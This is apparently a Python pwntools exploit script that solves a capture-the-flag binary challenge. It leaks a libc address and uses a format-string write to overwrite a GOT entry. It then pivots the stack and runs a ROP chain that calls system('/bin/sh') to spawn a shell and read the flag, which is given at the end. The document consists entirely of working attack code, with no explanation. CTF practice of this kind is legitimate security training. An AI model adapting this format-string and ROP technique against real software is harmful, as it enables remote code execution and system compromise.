#!/usr/bin/env python
from pwn import *
from pwn import p8, p16, p32, p64, u8, u16, u32, u64
from time import sleep

context.binary = e = ELF("./chall")
libc = ELF("./libc.so.6")
gs = """
b strdup
brva 0x0159F
c
"""


def start():
	if args.LOCAL:
		p = process([e.path])

	elif args.REMOTE:
		p = remote(args.HOST, int(args.PORT))
	return p


p = start()

p.sendlineafter(b">> ", b"1")

p.recvuntil(b"0x")
libc.address = int(p.recv(12).decode(), 16) - libc.sym.fgets

memcpy_got = libc.address + 0x1fe170  # 0x1fe080
strlen_got = libc.address + 0x1fe080


def overwrite(addr, val):
	dword = val & ((1 << 32) - 1)
	pl = f'%{dword}c%8$n'.encode().ljust(0x10, b"\0")
	pl += p64(addr)
	p.sendlineafter(b">> ", b"2")
	p.sendlineafter(b"Input\n>> ", pl)


# def overwrite(addr, val):
#	 word = val & ((1 << 16) - 1)
#	 word2 = (val >> 16) & ((1 << 16) - 1)
#	 if word < word2:
#		 pl = f'%{word}c%{word2-word}c%8$hn%9$hn'.encode().ljust(0x10, b"\0")
#	 else:
#		 pl = f'%{word2}c%{word-word2}c%9$hn%8$hn'.encode().ljust(0x10, b"\0")
#	 pl += p64(addr)
#	 pl += p64(addr+2)
#	 p.sendlineafter(b">> ", b"2")
#	 p.sendlineafter(b"Input\n>> ", pl)


def dup(buf):
	p.sendlineafter(b">> ", b"3")
	p.sendlineafter(b"Input\n>> ", buf)


if args.GDB:
	gdb.attach(p, gdbscript=gs, api=True)
	sleep(1)

# push rsi ; pop rsp ; stc ; jmp qword ptr [rsi + 0xf]
overwrite(memcpy_got, libc.address+0x0000000000090776)

dup(
	p64(libc.address+0xA1453)  # mov edi, r12d ; call read
	+ b"A"*0x7
	# shl rdx, 0x20 ; or rax, rdx ; ret
	+ p64(libc.address+0x0000000000145adc)
)

p.sendline(
	p64(libc.address+0x0000000000028715) +
	p64(next(libc.search(b"/bin/sh"))) +
	p64(libc.sym.system)
)

p.clean()

p.sendline(b"cat flag")

p.interactive()

# flag{A_f0rm47_5tr1ng_w1th0ut_l33k}
